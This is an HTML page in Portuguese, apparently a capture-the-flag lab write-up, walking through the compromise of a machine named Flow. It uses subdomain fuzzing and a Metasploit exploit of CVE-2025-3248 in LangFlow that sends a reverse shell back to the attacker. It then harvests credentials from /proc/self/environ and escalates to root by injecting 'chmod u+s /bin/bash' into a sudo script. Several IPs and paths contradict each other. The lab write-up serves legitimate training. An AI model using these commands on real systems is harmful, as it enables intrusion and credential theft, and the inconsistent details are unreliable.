<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flow - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>FLOW</h1>
            <p class="subtitle">Walkthrough da Exploração do Alvo</p>
        </header>
        
        <section class="intro">
            <h2>Flow</h2>
            <p>Este documento detalha o processo de exploração do alvo Flow (172.16.12.242), incluindo descoberta de subdomínios, exploração de vulnerabilidades no LangFlow 1.2.0 e escalação de privilégios.</p>
            
            <div class="highlight">
                <strong>Nota:</strong> Este walkthrough demonstra técnicas de enumeração de subdomínios, exploração de CVE-2025-3248 no LangFlow e escalação de privilégios através de exploração de variáveis de ambiente.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Configuração Inicial</h3>
                </div>
                <p>Primeiro, adicionei o domínio ao arquivo hosts para facilitar o acesso:</p>
                <div class="code">
                    # Adicionar ao /etc/hosts
                    172.16.12.242 flow.hc
                </div>
                
                <p>O alvo principal identificado foi: <code>172.16.12.242</code> com domínio <code>flow.hc</code>.</p>
                
            </div>
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento Básico de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento básico de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV 10.201.98.251
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 80/tcp: HTTP <br> </li>
                        <li>Porta 22/tpc: SSH</li>
                    </ul>
                </div>
                
                <p>O resultado mostra apenas um serviço web nginx na porta 80.</p>
            </div>
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Enumeração de Subdomínios</h3>
                </div>
                <p>Usei o FFUF para descobrir subdomínios válidos:</p>
                
                <div class="code">
                    ffuf -c -u http://flow.hc -H "HOST: FUZZ.flow.hc" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 150 -fw 6
                </div>
                
                <div class="highlight">
                    <strong>Parâmetros explicados:</strong>
                    <ul>
                        <li><code>-c</code>: Saída colorida</li>
                        <li><code>-H "HOST: FUZZ.flow.hc"</code>: Header onde será substituído pelas entradas da wordlist</li>
                        <li><code>-fw 6</code>: Filtra respostas com tamanho 6 (erros 404)</li>
                    </ul>
                </div>
                
                <p>Durante a enumeração, descobri o subdomínio <code>lang.flow.hc</code></p>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração do LangFlow</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Enumeração Adicional</h3>
                </div>
                <p>Usei o GoBuster para enumerar diretórios no subdomínio descoberto:</p>
                
                <div class="code">
                    gobuster dir -u http://lang.flow.hc -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
                </div>
                
                <div class="highlight">
                    <strong>Resultado:</strong> Identifiquei que se tratava de uma instância do LangFlow versão 1.2.0.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Pesquisa por Exploits</h3>
                </div>
                <p>Pesquisei por vulnerabilidades conhecidas no LangFlow 1.2.0:</p>
                
                <div class="highlight">
                    <strong>Vulnerabilidade encontrada:</strong> CVE-2025-3248 - uma vulnerabilidade de execução remota de código (RCE) no LangFlow.
                </div>
                
                <p>Esta vulnerabilidade permite execução remota de código não autenticada.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Exploração com Metasploit</h3>
                </div>
                <p>Usei o framework Metasploit para explorar a vulnerabilidade:</p>
                
                <div class="code">
                    msfconsole <br>
                    search 2025-3248<br>
                    use 0<br>
                    set LHOST 10.0.72.227<br>
                    set RHOSTS http://lang.flow.hc/login<br>
                    show options<br>
                    run<br>
                </div>
                
                <div class="highlight">
                    <strong>Configurações do exploit:</strong>
                    <ul>
                        <li><strong>RHOSTS:</strong> http://lang.flow.hc/login</li>
                        <li><strong>RPORT:</strong> 7860</li>
                        <li><strong>LHOST:</strong> 172.16.1.211</li>
                        <li><strong>LPORT:</strong> 4444</li>
                    </ul>
                </div>
                
                <p>A exploração foi bem-sucedida, obtendo acesso ao sistema através de um meterpreter shell.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Pós-Exploração</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Exploração do Sistema Comprometido</h3>
                </div>
                <p>Após obter acesso, usei os comandos:</p>
                
                <div class="code">
                    shell<br>
                    bash -i<br>
                    whoami<br>
                </div>
                
                <p>Para examinar variáveis de ambiente que poderiam conter credenciais:</p>
                
                <div class="code">
                    cat /proc/self/environ | tr '\0' '\n'
                </div>
                
                <div class="highlight">
                    <strong>Informações sensíveis descobertas:</strong>
                    <ul>
                        <li><strong>LANGFLOW_SUPERUSER:</strong> andrew</li>
                        <li><strong>LANGFLOW_SUPERUSER_PASSWORD:</strong> eb1MNdO4oaVj9l4OT</li>
                    </ul>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Acesso SSH com Credenciais</h3>
                </div>
                <p>Usei as credenciais descobertas para acessar o sistema via SSH:</p>
                
                <div class="code">
                    ssh andrew@172.16.11.153
                </div>
                
                <p>Senha: <code>eb1MNdO4oaVj9l4OT</code></p>
                
                <div class="highlight">
                    <strong>Acesso bem-sucedido:</strong> Consegui acesso SSH como usuário andrew.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">8</div>
                    <h3>Primeira Flag</h3>
                </div>
                <p>Com acesso ao sistema, procurei pela flag de usuário:</p>
                
                <div class="code">
                    cat user.txt
                </div>
                
                <div class="highlight">
                    <strong>Flag de usuário encontrada:</strong> hackingclub{03aOf34Be9ac4bbc17133ie3ec5ac530}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">9</div>
                    <h3>Explorando Sudoers</h3>
                </div>
                <p>Verifiquei privilégios sudo disponíveis para o usuário andrew:</p>
                
                <div class="code">
                    sudo -l
                </div>
                
                <p>Descobri que o usuário andrew pode executar o script <code>/api/ai_service.sh</code> como root sem senha.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">10</div>
                    <h3>Explorando Vulnerabilidade no Script</h3>
                </div>
                <p>Analisei o script e descobri uma vulnerabilidade de injeção de comando</p>
                
                <p>Esta exploração permitiu executar comandos arbitrários como root.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">11</div>
                    <h3>Obtendo Shell Root</h3>
                </div>
                <p>Explorei a vulnerabilidade para obter um shell com privilégios de root:</p>
                
                <div class="code">
                    sudo /opt/ai_service.sh <br>
                    1; id # <br>
                    1; id # <br>
                    1; chmod u+s /bin/bash # <br>
                </div>
                
                <div class="highlight">
                    <strong>Escalação de privilégios bem-sucedida:</strong> Agora com acesso root completo ao sistema.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">12</div>
                    <h3>Flag de Root</h3>
                </div>
                <p>Com acesso root, procurei pela flag final:</p>
                
                <div class="code">
                    cd /root
                    ls
                    cat root.txt
                </div>
                
                <div class="highlight">
                    <strong>Flag de root capturada:</strong> [Flag não especificada no documento]
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>ffuf</code></td>
                    <td>Fuzzing de subdomínios</td>
                    <td>Descobrir subdomínios válidos</td>
                </tr>
                <tr>
                    <td><code>gobuster dir</code></td>
                    <td>Enumeração de diretórios web</td>
                    <td>Encontrar paths ocultos</td>
                </tr>
                <tr>
                    <td>Metasploit</td>
                    <td>Exploração de CVE-2025-3248</td>
                    <td>Obter acesso inicial</td>
                </tr>
                <tr>
                    <td><code>cat /proc/self/environ</code></td>
                    <td>Leitura de variáveis de ambiente</td>
                    <td>Coletar credenciais</td>
                </tr>
                <tr>
                    <td><code>sudo /api/ai_service.sh</code></td>
                    <td>Exploração de injeção de comando</td>
                    <td>Escalar privilégios para root</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Enumeração de subdomínios com FFUF revelou o subdomínio lang.flow.hc executando LangFlow 1.2.0.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-bug"></i>
                        </div>
                        <h3>Exploração</h3>
                    </div>
                    <div class="card-content">
                        <p>CVE-2025-3248 explorado com Metasploit para obter shell reverso e acesso inicial ao sistema.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-crown"></i>
                        </div>
                        <h3>Escalação</h3>
                    </div>
                    <div class="card-content">
                        <p>Credenciais descobertas em variáveis de ambiente e vulnerabilidade de injeção de comando explorada para obter root.</p>
                    </div>
                </div>
            </div>
            
        </section>
        
        <footer>
            <p>Walkthrough Flow - Documentação do processo de exploração</p>
        </footer>
    </div>
</body>
</html>